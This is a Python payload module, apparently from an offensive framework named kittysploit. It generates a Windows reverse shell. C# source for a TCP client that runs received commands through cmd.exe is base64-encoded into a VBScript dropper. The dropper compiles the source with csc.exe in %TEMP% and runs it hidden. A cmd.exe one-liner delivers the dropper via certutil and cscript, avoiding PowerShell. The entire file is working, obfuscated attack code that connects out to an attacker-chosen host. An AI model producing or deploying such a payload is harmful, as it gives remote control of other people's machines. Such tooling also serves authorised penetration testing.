from kittysploit import *
import base64


class Module(Payload):

	CLIENT_LANGUAGE = "vbscript"

	__info__ = {
		"name": "Windows VBScript Reverse TCP (csc on-box)",
		"description": (
			"VBScript/cscript delivery vector: writes a tiny C# reverse shell, compiles with "
			"csc.exe (.NET Framework), and runs it — no powershell.exe"
		),
		"category": PayloadCategory.CMD,
		"arch": Arch.OTHER,
		"platform": Platform.WINDOWS,
		"listener": "listeners/multi/reverse_tcp",
		"handler": Handler.REVERSE,
		"session_type": SessionType.SHELL,
	}

	lhost = OptString("127.0.0.1", "Connect to IP address", True)
	lport = OptPort(4444, "Connect to port", True)
	output = OptString(
		"cmd",
		"Output form: cmd (one-liner) | vbs (raw VBScript source)",
		False,
	)

	def _csharp_source(self) -> str:
		host = str(self.lhost)
		port = int(self.lport)
		return (
			"using System;using System.Diagnostics;using System.IO;using System.Net.Sockets;"
			"class K{static void Main(){try{var c=new TcpClient(\"" + host + "\"," + str(port) + ");"
			"var s=c.GetStream();var r=new StreamReader(s);var w=new StreamWriter(s){AutoFlush=true};"
			"w.WriteLine(\"KittySploit VBScript/csc shell\");"
			"for(;;){var cmd=r.ReadLine();if(cmd==null)break;cmd=cmd.Trim();if(cmd.Length==0)continue;"
			"if(cmd==\"exit\"||cmd==\"quit\")break;"
			"var p=new ProcessStartInfo(\"cmd.exe\",\"/c \"+cmd);"
			"p.RedirectStandardOutput=true;p.RedirectStandardError=true;p.UseShellExecute=false;p.CreateNoWindow=true;"
			"var x=Process.Start(p);var o=x.StandardOutput.ReadToEnd()+x.StandardError.ReadToEnd();x.WaitForExit();"
			"if(o.Length==0)o=\"[exit \"+x.ExitCode+\"]\\n\";w.Write(o);}}catch{}}}"
		)

	def _vbscript_content(self) -> str:
		cs_b64 = base64.b64encode(self._csharp_source().encode("utf-8")).decode("ascii")
		return f"""On Error Resume Next
Dim b64, src, exe, sh, fso, xml, node, bytes, stream, cscs, i, csc
b64 = "{cs_b64}"
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
src = sh.ExpandEnvironmentStrings("%TEMP%\\ks_vbs_rev.cs")
exe = sh.ExpandEnvironmentStrings("%TEMP%\\ks_vbs_rev.exe")
Set xml = CreateObject("MSXML2.DOMDocument.3.0")
Set node = xml.createElement("b64")
node.dataType = "bin.base64"
node.text = b64
bytes = node.nodeTypedValue
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write bytes
stream.SaveToFile src, 2
stream.Close
cscs = Array( _
  sh.ExpandEnvironmentStrings("%WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"), _
  sh.ExpandEnvironmentStrings("%WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe"), _
  sh.ExpandEnvironmentStrings("%WINDIR%\\Microsoft.NET\\Framework64\\v3.5\\csc.exe"), _
  sh.ExpandEnvironmentStrings("%WINDIR%\\Microsoft.NET\\Framework\\v3.5\\csc.exe") _
)
For i = 0 To UBound(cscs)
  csc = cscs(i)
  If fso.FileExists(csc) Then
    sh.Run Chr(34) & csc & Chr(34) & " /nologo /t:exe /out:" & Chr(34) & exe & Chr(34) & " " & Chr(34) & src & Chr(34), 0, True
    Exit For
  End If
Next
If fso.FileExists(exe) Then
  sh.Run Chr(34) & exe & Chr(34), 0, False
End If
"""

	def generate(self):
		mode = str(self.output or "cmd").strip().lower()
		vbs = self._vbscript_content()
		if mode == "vbs":
			return vbs

		vbs_b64 = base64.b64encode(vbs.encode("utf-8")).decode("ascii")
		return (
			'cmd.exe /c "'
			f'echo {vbs_b64}>%TEMP%\\ks.vbs.b64 & '
			'certutil -decode %TEMP%\\ks.vbs.b64 %TEMP%\\ks.vbs >nul & '
			'cscript //nologo %TEMP%\\ks.vbs"'
		)
